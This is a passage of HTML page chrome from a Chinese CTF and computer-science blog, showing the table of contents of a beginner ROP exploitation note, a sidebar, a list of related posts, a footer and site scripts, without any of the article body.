class="toc-number">3.10.</span> <span class="toc-text">0. 使用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E6%A0%B8%E5%BF%83"><span class="toc-number">3.11.</span> <span class="toc-text">1. 核心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E5%86%85%E5%AD%98%E5%88%86%E5%B8%83%E4%B8%BE%E4%BE%8B"><span class="toc-number">3.12.</span> <span class="toc-text">2. 内存分布，举例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%BA%A2%E5%87%BA%E7%9B%AE%E6%A0%87%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">3.13.</span> <span class="toc-text">3. 第一次溢出，目标：找到一个函数地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E7%AC%AC%E4%BA%8C%E6%AC%A1%E6%BA%A2%E5%87%BA%E7%9B%AE%E6%A0%87%E7%9B%B4%E6%8E%A5%E8%8E%B7%E5%BE%97shell%E5%83%8Frettext%E4%B8%80%E6%A0%B7"><span class="toc-number">3.14.</span> <span class="toc-text">4. 第二次溢出，目标：直接获得 shell，像 rettext 一样</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#41%E8%8E%B7%E5%BE%97%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">3.14.1.</span> <span class="toc-text">4.1 获得基地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#42system%E5%92%8Cbinsh%E5%9C%B0%E5%9D%80"><span class="toc-number">3.14.2.</span> <span class="toc-text">4.2system 和 binsh 地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#43%E7%BB%93%E6%9D%9F"><span class="toc-number">3.14.3.</span> <span class="toc-text">4.3 结束</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#44%E8%A1%A5%E5%85%85"><span class="toc-number">3.14.4.</span> <span class="toc-text">4.4 补充</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/CTF/Pwn/note/PWN%E6%A6%82%E8%BF%B0/" rel="bookmark" title="Pwn概述">Pwn概述</a></li><li class="active"><a href="/CTF/Pwn/note/Pwn1/" rel="bookmark" title="Pwn复习-初级ROP">Pwn复习-初级ROP</a></li><li><a href="/CTF/Pwn/note/Pwn%E9%A2%98%E5%9E%8B/" rel="bookmark" title="常见漏洞">常见漏洞</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="4riH04X" data-src="/images/avatar.jpg"><p class="name" itemprop="name">4riH04X</p><div class="description" itemprop="description">我们从不回头</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">22</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">14</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">8</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL001MjExMQ==" title="https:&#x2F;&#x2F;github.com&#x2F;M52111"><i class="ic i-github"></i></span> <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS9tamtvLTg1" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;mjko-85"><i class="ic i-zhihu"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjgwNTIyMjU1NEBxcS5jb20=" title="mailto:805222554@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/CTF/Pwn/note/PWN%E6%A6%82%E8%BF%B0/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/computer-science/Data-Structures/cpp/%E4%BA%8C%E5%8F%89%E6%A0%91%E9%A2%98%E8%A7%A3/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/" title="分类于 Pwn">Pwn</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/Game/" title="分类于 Game">Game</a></div><span><a href="/CTF/Pwn/Game/Scuctf2023-Write-up/" title="2023-12-03【2023Scuctf】_WP">2023-12-03【2023Scuctf】_WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/computer-science/" title="分类于 计算机科学">计算机科学</a> <i class="ic i-angle-right"></i> <a href="/categories/computer-science/Data-Structures/" title="分类于 数据结构与算法">数据结构与算法</a> <i class="ic i-angle-right"></i> <a href="/categories/computer-science/Data-Structures/cpp/" title="分类于 C++">C++</a></div><span><a href="/computer-science/Data-Structures/cpp/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%A4%8D%E4%B9%A0/" title="数据结构与算法食用指南">数据结构与算法食用指南</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/" title="分类于 Pwn">Pwn</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/note/" title="分类于 笔记">笔记</a></div><span><a href="/CTF/Pwn/note/Pwn1/" title="Pwn复习-初级ROP">Pwn复习-初级ROP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/computer-science/" title="分类于 计算机科学">计算机科学</a> <i class="ic i-angle-right"></i> <a href="/categories/computer-science/Data-Structures/" title="分类于 数据结构与算法">数据结构与算法</a> <i class="ic i-angle-right"></i> <a href="/categories/computer-science/Data-Structures/cpp/" title="分类于 C++">C++</a></div><span><a href="/computer-science/Data-Structures/cpp/%E6%9F%A5%E6%89%BE_%E9%A2%98%E8%A7%A31206/" title="查找题解">查找题解</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/" title="分类于 博客说明">博客说明</a></div><span><a href="/%E5%9F%BA%E4%BA%8Ehexo%E5%92%8Cshoka%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" title="基于hexo和shoka的博客使用教程">基于hexo和shoka的博客使用教程</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/About-me/" title="分类于 关于自我">关于自我</a></div><span><a href="/About-me/My-first-Boke/" title="我的第一篇博客">我的第一篇博客</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/" title="分类于 Pwn">Pwn</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/Game/" title="分类于 Game">Game</a></div><span><a href="/CTF/Pwn/Game/t1d_foolctf/" title="2024-04-01 【t1d_FoolCTF】WP">2024-04-01 【t1d_FoolCTF】WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/" title="分类于 Pwn">Pwn</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/Game/" title="分类于 Game">Game</a></div><span><a href="/CTF/Pwn/Game/2024BeginCTFWP/" title="2024-02-07【2024 Begin CTF】_WP">2024-02-07【2024 Begin CTF】_WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/" title="分类于 Pwn">Pwn</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/note/" title="分类于 笔记">笔记</a></div><span><a href="/CTF/Pwn/note/Pwn%E9%A2%98%E5%9E%8B/" title="常见漏洞">常见漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/computer-science/" title="分类于 计算机科学">计算机科学</a> <i class="ic i-angle-right"></i> <a href="/categories/computer-science/Data-Structures/" title="分类于 数据结构与算法">数据结构与算法</a> <i class="ic i-angle-right"></i> <a href="/categories/computer-science/Data-Structures/cpp/" title="分类于 C++">C++</a></div><span><a href="/computer-science/Data-Structures/cpp/%E7%BA%BF%E6%80%A7%E8%A1%A8%E9%A2%98%E8%A7%A3/" title="线性表题解">线性表题解</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2023 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">4riH04X @ Bomb_4riH04X</span> <a data-v-0843d86f="" href="https://beian.miit.gov.cn/#/Integrated/index" target="_blank">渝ICP备2024025292号</a></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">200k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">3:02</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"CTF/Pwn/note/Pwn1/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({model:{jsonPath:"live2d-widget-model-haruto"},display:{position:"left",width:150,height:300},mobile:{show:!1},log:!1,pluginJsPath:"lib/",pluginModelPath:"assets/",pluginRootPath:"live2dw/",tagMode:!1})</script></body></html><!-- rebuild by hrmmi -->